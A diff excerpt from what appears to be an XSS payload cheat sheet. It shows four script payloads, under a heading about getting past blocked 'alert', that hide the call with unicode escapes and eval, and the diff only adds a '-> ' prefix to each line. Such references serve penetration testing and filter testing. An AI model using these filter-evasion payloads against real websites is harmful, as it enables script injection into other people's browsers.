@@ -128,13 +128,13 @@ https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
  
 #### blocked - alert - bypass
   
-<script>\u0061lert(1)</script>
+-> <script>\u0061lert(1)</script>
   
-<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
+-> <script>\u0061\u006C\u0065\u0072\u0074(1)</script>
   
-<script>eval("\u0061lert(1)")</script>
+-> <script>eval("\u0061lert(1)")</script>
   
-<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
+-> <script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script> 
   
 #### Removing HTML Tags
   
